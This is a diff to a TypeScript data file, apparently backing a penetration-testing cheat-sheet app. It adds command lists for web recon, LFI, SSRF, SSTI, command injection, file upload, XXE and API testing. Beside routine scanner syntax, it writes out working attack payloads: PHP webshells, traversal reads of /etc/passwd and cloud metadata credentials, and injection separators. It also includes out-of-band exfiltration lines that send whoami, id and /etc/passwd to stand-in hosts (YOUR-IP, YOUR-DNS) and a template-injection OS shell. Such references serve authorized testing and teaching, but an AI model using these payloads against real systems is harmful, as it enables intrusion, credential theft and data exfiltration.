@@ -499,6 +499,113 @@ export const tools: Tool[] = [
     ],
   },
   {
+    id: 'web-methodology',
+    name: 'Web Pentest Methodology',
+    tags: ['recon', 'web', 'enumeration'],
+    description: 'Structured web app checklist: tech, paths, inputs, backups, TLS and headers',
+    categories: [
+      {
+        name: 'Initial Checks',
+        commands: [
+          { label: 'Headers', cmd: 'curl -k -I https://TARGET' },
+          { label: 'Robots', cmd: 'curl -k https://TARGET/robots.txt' },
+          { label: 'Sitemap', cmd: 'curl -k https://TARGET/sitemap.xml' },
+          { label: 'Well-known paths', cmd: 'curl -k https://TARGET/.well-known/security.txt' },
+          { label: 'HTTP methods', cmd: 'curl -k -X OPTIONS -i https://TARGET/' },
+          { label: 'Forced error probe', cmd: 'curl -k -i "https://TARGET/~random/%s"' },
+        ],
+      },
+      {
+        name: 'TLS & WAF',
+        commands: [
+          { label: 'testssl HTML report', cmd: './testssl.sh --htmlfile report.html TARGET:443' },
+          { label: 'sslscan', cmd: 'sslscan TARGET:443' },
+          { label: 'sslyze regular', cmd: 'sslyze --regular TARGET:443' },
+          { label: 'Nmap WAF detect', cmd: 'nmap --script http-waf-detect,http-waf-fingerprint -p 80,443 TARGET' },
+        ],
+      },
+      {
+        name: 'Backup Files',
+        commands: [
+          { label: 'Common backup suffixes', cmd: 'ffuf -u https://TARGET/FUZZ -w paths.txt -e .bak,.old,.orig,.backup,.swp,.zip,.tar.gz' },
+          { label: 'Known files via curl', cmd: 'for f in index.php.bak config.php.old .env composer.json; do curl -skI https://TARGET/$f; done' },
+          { label: 'Git exposed', cmd: 'curl -k -I https://TARGET/.git/HEAD' },
+          { label: 'SVN exposed', cmd: 'curl -k -I https://TARGET/.svn/entries' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'katana-gau-wayback',
+    name: 'katana / gau / waybackurls',
+    tags: ['recon', 'web', 'enumeration'],
+    description: 'URL discovery from crawling, JavaScript and historical archives',
+    categories: [
+      {
+        name: 'Crawling',
+        commands: [
+          { label: 'Katana crawl', cmd: 'katana -u https://TARGET -d 3 -o katana.txt' },
+          { label: 'Katana JS crawl', cmd: 'katana -u https://TARGET -jc -kf all -d 3 -o urls.txt' },
+          { label: 'Hakrawler', cmd: 'echo https://TARGET | hakrawler -depth 3 -plain -usewayback | tee urls.txt' },
+          { label: 'Gospider', cmd: 'gospider -s https://TARGET -d 3 -a -w -r > gospider.txt' },
+        ],
+      },
+      {
+        name: 'Historical URLs',
+        commands: [
+          { label: 'gau', cmd: 'gau DOMAIN | tee gau.txt' },
+          { label: 'waybackurls', cmd: 'echo DOMAIN | waybackurls | tee wayback.txt' },
+          { label: 'Merge unique URLs', cmd: 'cat katana.txt gau.txt wayback.txt | sort -u > all_urls.txt' },
+          { label: 'Only URLs with params', cmd: 'cat all_urls.txt | grep "=" | uro | tee param_urls.txt' },
+          { label: 'Interesting extensions', cmd: 'cat all_urls.txt | grep -Ei "\\.(php|aspx|jsp|json|xml|config|bak|old)(\\?|$)"' },
+        ],
+      },
+      {
+        name: 'JavaScript',
+        commands: [
+          { label: 'Collect JS URLs', cmd: 'cat all_urls.txt | grep -Ei "\\.js(\\?|$)" | sort -u > js.txt' },
+          { label: 'LinkFinder', cmd: 'python3 linkfinder.py -i https://TARGET/app.js -o cli' },
+          { label: 'SecretFinder', cmd: 'python3 SecretFinder.py -i https://TARGET/app.js -o cli' },
+          { label: 'xnLinkFinder', cmd: 'xnLinkFinder -i https://TARGET -d 3 -o endpoints.txt' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'arjun-paramspider',
+    name: 'Arjun / ParamSpider',
+    tags: ['enumeration', 'web', 'fuzzing'],
+    description: 'Hidden parameter discovery for GET, POST, JSON and archived URLs',
+    categories: [
+      {
+        name: 'Arjun',
+        commands: [
+          { label: 'GET params', cmd: 'arjun -u https://TARGET/page -m GET' },
+          { label: 'POST params', cmd: 'arjun -u https://TARGET/login -m POST' },
+          { label: 'JSON body', cmd: 'arjun -u https://TARGET/api -m JSON' },
+          { label: 'Targets file', cmd: 'arjun -i urls.txt -oT arjun_params.txt' },
+          { label: 'Stable rate', cmd: 'arjun -u https://TARGET/page --rate 10 --stable' },
+        ],
+      },
+      {
+        name: 'ParamSpider',
+        commands: [
+          { label: 'Domain params', cmd: 'paramspider -d DOMAIN -o params.txt' },
+          { label: 'Exclude static', cmd: 'paramspider -d DOMAIN --exclude woff,css,png,svg,jpg,js' },
+          { label: 'Pipe to qsreplace', cmd: 'cat params.txt | qsreplace FUZZ | tee fuzzable.txt' },
+        ],
+      },
+      {
+        name: 'Param Fuzz',
+        commands: [
+          { label: 'ffuf GET param names', cmd: 'ffuf -u "https://TARGET/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs SIZE' },
+          { label: 'ffuf POST param names', cmd: 'ffuf -u https://TARGET/api -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -w params.txt -fs SIZE' },
+          { label: 'Reflected params', cmd: 'cat urls.txt | grep "=" | qsreplace hackref | while read u; do curl -sk "$u" | grep -q hackref && echo "$u"; done' },
+        ],
+      },
+    ],
+  },
+  {
     id: 'kerbrute',
     name: 'kerbrute',
     tags: ['enumeration', 'active directory', 'kerberos', 'brute force'],
@@ -564,6 +671,142 @@ export const tools: Tool[] = [
           { label: 'Tamper scripts', cmd: 'sqlmap -u "https://TARGET/page?id=1" --tamper=space2comment,between' },
           { label: 'Level/risk', cmd: 'sqlmap -u "https://TARGET/page?id=1" --level=5 --risk=3' },
           { label: 'Tor proxy', cmd: 'sqlmap -u "https://TARGET/page?id=1" --tor --tor-type=SOCKS5' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'lfi-path-traversal',
+    name: 'LFI / Path Traversal',
+    tags: ['exploitation', 'web', 'file inclusion'],
+    description: 'Local file inclusion and traversal probes for Unix, Windows and wrappers',
+    categories: [
+      {
+        name: 'Linux Files',
+        commands: [
+          { label: 'Read passwd', cmd: 'curl -k "https://TARGET/page?file=../../../../etc/passwd"' },
+          { label: 'URL encoded traversal', cmd: 'curl -k "https://TARGET/page?file=..%2f..%2f..%2f..%2fetc%2fpasswd"' },
+          { label: 'Double encoded traversal', cmd: 'curl -k "https://TARGET/page?file=..%252f..%252f..%252fetc%252fpasswd"' },
+          { label: 'Null byte legacy', cmd: 'curl -k "https://TARGET/page?file=../../../../etc/passwd%00"' },
+          { label: 'Proc environ', cmd: 'curl -k "https://TARGET/page?file=../../../../proc/self/environ"' },
+          { label: 'Apache logs', cmd: 'curl -k "https://TARGET/page?file=../../../../var/log/apache2/access.log"' },
+        ],
+      },
+      {
+        name: 'Windows Files',
+        commands: [
+          { label: 'Win.ini', cmd: 'curl -k "https://TARGET/page?file=..\\..\\..\\..\\Windows\\win.ini"' },
+          { label: 'Hosts file', cmd: 'curl -k "https://TARGET/page?file=../../../../Windows/System32/drivers/etc/hosts"' },
+          { label: 'IIS web config', cmd: 'curl -k "https://TARGET/page?file=../../../../inetpub/wwwroot/web.config"' },
+        ],
+      },
+      {
+        name: 'PHP Wrappers',
+        commands: [
+          { label: 'Base64 source read', cmd: 'curl -k "https://TARGET/page?file=php://filter/convert.base64-encode/resource=index.php"' },
+          { label: 'Data wrapper probe', cmd: 'curl -k "https://TARGET/page?file=data://text/plain,<?php phpinfo(); ?>"' },
+          { label: 'Input wrapper POST', cmd: 'curl -k -X POST --data "<?php system($_GET[cmd]); ?>" "https://TARGET/page?file=php://input&cmd=id"' },
+          { label: 'Zip wrapper', cmd: 'curl -k "https://TARGET/page?file=zip://uploads/shell.jpg%23shell.php"' },
+          { label: 'Expect wrapper', cmd: 'curl -k "https://TARGET/page?file=expect://id"' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'ssrf',
+    name: 'SSRF',
+    tags: ['exploitation', 'web', 'cloud'],
+    description: 'Server-side request forgery probes for metadata, internal ports and URL parser bypasses',
+    categories: [
+      {
+        name: 'Basic Probes',
+        commands: [
+          { label: 'Localhost', cmd: 'curl -k "https://TARGET/fetch?url=http://127.0.0.1:80/"' },
+          { label: 'Alt localhost', cmd: 'curl -k "https://TARGET/fetch?url=http://localhost:80/"' },
+          { label: 'IPv6 loopback', cmd: 'curl -k "https://TARGET/fetch?url=http://[::1]/"' },
+          { label: 'Decimal IP bypass', cmd: 'curl -k "https://TARGET/fetch?url=http://2130706433/"' },
+          { label: 'Redirect helper', cmd: 'curl -k "https://TARGET/fetch?url=https://YOUR-DOMAIN/redirect-to-localhost"' },
+        ],
+      },
+      {
+        name: 'Cloud Metadata',
+        commands: [
+          { label: 'AWS metadata root', cmd: 'curl -k "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"' },
+          { label: 'AWS role name', cmd: 'curl -k "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"' },
+          { label: 'GCP metadata', cmd: 'curl -k -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/"' },
+          { label: 'Azure metadata', cmd: 'curl -k -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"' },
+        ],
+      },
+      {
+        name: 'Automation',
+        commands: [
+          { label: 'Interactsh callback', cmd: 'interactsh-client -o ssrf-callbacks.txt' },
+          { label: 'ffuf internal ports', cmd: 'ffuf -u "https://TARGET/fetch?url=http://127.0.0.1:FUZZ/" -w ports.txt -fs SIZE' },
+          { label: 'Gopherus payloads', cmd: 'gopherus --exploit redis' },
+          { label: 'SSRFmap', cmd: 'python3 ssrfmap.py -r request.txt -p url -m portscan' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'ssti',
+    name: 'SSTI',
+    tags: ['exploitation', 'web', 'template injection'],
+    description: 'Server-side template injection probes for Jinja2, Twig, Freemarker and ERB',
+    categories: [
+      {
+        name: 'Detection',
+        commands: [
+          { label: 'Generic arithmetic', cmd: 'curl -k "https://TARGET/page?name={{7*7}}"' },
+          { label: 'Jinja2 probe', cmd: 'curl -k "https://TARGET/page?name={{config.__class__.__init__.__globals__}}"' },
+          { label: 'Twig probe', cmd: 'curl -k "https://TARGET/page?name={{_self}}"' },
+          { label: 'Freemarker probe', cmd: 'curl -k "https://TARGET/page?name=${7*7}"' },
+          { label: 'ERB probe', cmd: 'curl -k "https://TARGET/page?name=<%= 7*7 %>"' },
+        ],
+      },
+      {
+        name: 'Tplmap',
+        commands: [
+          { label: 'GET test', cmd: 'tplmap -u "https://TARGET/page?name=test"' },
+          { label: 'POST test', cmd: 'tplmap -u https://TARGET/render -d "name=test"' },
+          { label: 'OS command', cmd: 'tplmap -u "https://TARGET/page?name=test" --os-cmd id' },
+          { label: 'Interactive shell', cmd: 'tplmap -u "https://TARGET/page?name=test" --os-shell' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'command-injection',
+    name: 'Command Injection',
+    tags: ['exploitation', 'web', 'rce'],
+    description: 'OS command injection separators, timing probes and out-of-band callbacks',
+    categories: [
+      {
+        name: 'Separators',
+        commands: [
+          { label: 'Semicolon', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1;id"' },
+          { label: 'AND chain', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1%26%26id"' },
+          { label: 'Pipe chain', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1%7Cid"' },
+          { label: 'Newline encoded', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1%0Aid"' },
+          { label: 'Backticks', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1`id`"' },
+          { label: 'Dollar subshell', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1$(id)"' },
+        ],
+      },
+      {
+        name: 'Blind Testing',
+        commands: [
+          { label: 'Linux sleep', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1;sleep 5"' },
+          { label: 'Windows ping delay', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1%26ping -n 6 127.0.0.1"' },
+          { label: 'DNS callback', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1;nslookup $(whoami).YOUR-DNS"' },
+          { label: 'HTTP callback', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1;curl http://YOUR-IP:8000/$(id -u)"' },
+        ],
+      },
+      {
+        name: 'Bypass Tokens',
+        commands: [
+          { label: 'IFS instead space', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1;cat${IFS}/etc/passwd"' },
+          { label: 'Brace expansion', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1;{cat,/etc/passwd}"' },
+          { label: 'Tab encoded', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1%0abash%09-c%09id"' },
         ],
       },
     ],
@@ -1182,6 +1425,135 @@ export const tools: Tool[] = [
           { label: 'With cookie', cmd: 'dalfox url "https://TARGET/page?id=1" --cookie "session=SESSIONID"' },
           { label: 'JSON output', cmd: 'dalfox url "https://TARGET/page?q=1" --json -o results.json' },
           { label: 'Blind XSS', cmd: 'dalfox url "https://TARGET/page?q=1" -b "https://YOUR_BLIND_XSS_SERVER"' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'file-upload',
+    name: 'File Upload Attacks',
+    tags: ['exploitation', 'web', 'file upload'],
+    description: 'Upload bypass checks for extensions, content-type, SVG, polyglots and archive parsing',
+    categories: [
+      {
+        name: 'Extension Bypass',
+        commands: [
+          { label: 'PHP extension list', cmd: 'for e in php php3 php4 php5 phtml phar inc; do cp shell.php "shell.$e"; done' },
+          { label: 'Double extension', cmd: 'cp shell.php shell.jpg.php' },
+          { label: 'Case bypass', cmd: 'cp shell.php shell.pHp5' },
+          { label: 'Trailing dot', cmd: 'cp shell.php "shell.php."' },
+          { label: 'Null byte legacy', cmd: 'printf "GIF89a<?php system($_GET[cmd]); ?>" > shell.php%00.gif' },
+        ],
+      },
+      {
+        name: 'Content Tricks',
+        commands: [
+          { label: 'GIF PHP polyglot', cmd: 'printf "GIF89a;<?php system($_GET[cmd]); ?>" > shell.gif.php' },
+          { label: 'SVG XSS probe', cmd: 'printf \'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>\' > xss.svg' },
+          { label: 'SVG XXE probe', cmd: 'printf \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>\' > xxe.svg' },
+          { label: 'MIME override', cmd: 'curl -k -F "file=@shell.php;type=image/jpeg" https://TARGET/upload' },
+          { label: 'Filename cmd probe', cmd: 'curl -k -F "file=@test.jpg;filename=;sleep 5;.jpg" https://TARGET/upload' },
+        ],
+      },
+      {
+        name: 'Archives',
+        commands: [
+          { label: 'Zip slip path', cmd: 'zip --symlinks payload.zip ../../../../var/www/html/shell.php' },
+          { label: 'Stack two zips', cmd: 'cat benign.zip evil.zip > combined.zip' },
+          { label: 'List unzip view', cmd: 'unzip -l combined.zip' },
+          { label: 'Zip bomb check', cmd: 'dd if=/dev/zero bs=1M count=10 | zip -9 bomb.zip -' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'xxe',
+    name: 'XXE',
+    tags: ['exploitation', 'web', 'xml', 'xxe'],
+    description: 'XML external entity testing for file read, SSRF and blind out-of-band exfiltration',
+    categories: [
+      {
+        name: 'File Read',
+        commands: [
+          { label: 'Basic passwd XML', cmd: 'printf \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>\' > xxe.xml' },
+          { label: 'POST XML', cmd: 'curl -k -X POST -H "Content-Type: application/xml" --data-binary @xxe.xml https://TARGET/api/xml' },
+          { label: 'Windows win.ini', cmd: 'printf \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>\' > win.xml' },
+        ],
+      },
+      {
+        name: 'SSRF',
+        commands: [
+          { label: 'Internal HTTP', cmd: 'printf \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>\' > ssrf.xml' },
+          { label: 'AWS metadata', cmd: 'printf \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>\' > aws.xml' },
+        ],
+      },
+      {
+        name: 'Blind XXE',
+        commands: [
+          { label: 'OOB DTD host', cmd: 'python3 -m http.server 8000' },
+          { label: 'External DTD payload', cmd: `printf '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '"'"'http://YOUR-IP:8000/?x=%file;'"'"'>">%eval;%exfil;' > evil.dtd` },
+          { label: 'XML loads DTD', cmd: 'printf \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://YOUR-IP:8000/evil.dtd">%dtd;]><root/>\' > blind.xml' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'wapiti-zap',
+    name: 'Wapiti / ZAP Baseline',
+    tags: ['enumeration', 'web', 'vulnerability', 'scanning'],
+    description: 'General-purpose web vulnerability scanners for authorized baseline testing',
+    categories: [
+      {
+        name: 'Wapiti',
+        commands: [
+          { label: 'Basic scan', cmd: 'wapiti -u https://TARGET' },
+          { label: 'Modules selected', cmd: 'wapiti -u https://TARGET -m xss,sql,xxe,ssrf,exec,file' },
+          { label: 'With cookies', cmd: 'wapiti -u https://TARGET -H "Cookie: session=SESSIONID"' },
+          { label: 'HTML report', cmd: 'wapiti -u https://TARGET -f html -o wapiti-report' },
+        ],
+      },
+      {
+        name: 'OWASP ZAP',
+        commands: [
+          { label: 'Baseline Docker', cmd: 'docker run -t owasp/zap2docker-stable zap-baseline.py -t https://TARGET -r zap.html' },
+          { label: 'Full scan Docker', cmd: 'docker run -t owasp/zap2docker-stable zap-full-scan.py -t https://TARGET -r zap-full.html' },
+          { label: 'API OpenAPI scan', cmd: 'docker run -t owasp/zap2docker-stable zap-api-scan.py -t https://TARGET/openapi.json -f openapi -r zap-api.html' },
+          { label: 'Proxy local browser', cmd: 'zap.sh -daemon -port 8080 -host 127.0.0.1' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'api-pentesting',
+    name: 'API Pentesting',
+    tags: ['enumeration', 'web', 'api', 'jwt', 'graphql'],
+    description: 'REST, OpenAPI, GraphQL and JWT-oriented API test commands',
+    categories: [
+      {
+        name: 'OpenAPI',
+        commands: [
+          { label: 'Download spec', cmd: 'curl -k https://TARGET/openapi.json -o openapi.json' },
+          { label: 'Swagger paths', cmd: 'jq -r ".paths | keys[]" openapi.json' },
+          { label: 'Kiterunner routes', cmd: 'kr scan https://TARGET -w routes-large.kite' },
+          { label: 'Kiterunner from spec', cmd: 'kr kb convert openapi.json -o routes.kite && kr scan https://TARGET -w routes.kite' },
+        ],
+      },
+      {
+        name: 'GraphQL',
+        commands: [
+          { label: 'Introspection probe', cmd: 'curl -k -X POST https://TARGET/graphql -H "Content-Type: application/json" -d \'{"query":"{__schema{types{name}}}"}\'' },
+          { label: 'Graphw00f detect', cmd: 'graphw00f -d -f -t https://TARGET/graphql' },
+          { label: 'Clairvoyance schema', cmd: 'clairvoyance https://TARGET/graphql -o schema.json' },
+          { label: 'Batch query probe', cmd: 'curl -k -X POST https://TARGET/graphql -H "Content-Type: application/json" -d \'[{"query":"{__typename}"},{"query":"{__typename}"}]\'' },
+        ],
+      },
+      {
+        name: 'JWT',
+        commands: [
+          { label: 'Decode token', cmd: 'jwt_tool TOKEN' },
+          { label: 'None alg test', cmd: 'jwt_tool TOKEN -X a' },
+          { label: 'Weak secret crack', cmd: 'hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt' },
+          { label: 'JWKS endpoint', cmd: 'curl -k https://TARGET/.well-known/jwks.json' },
         ],
       },
     ],
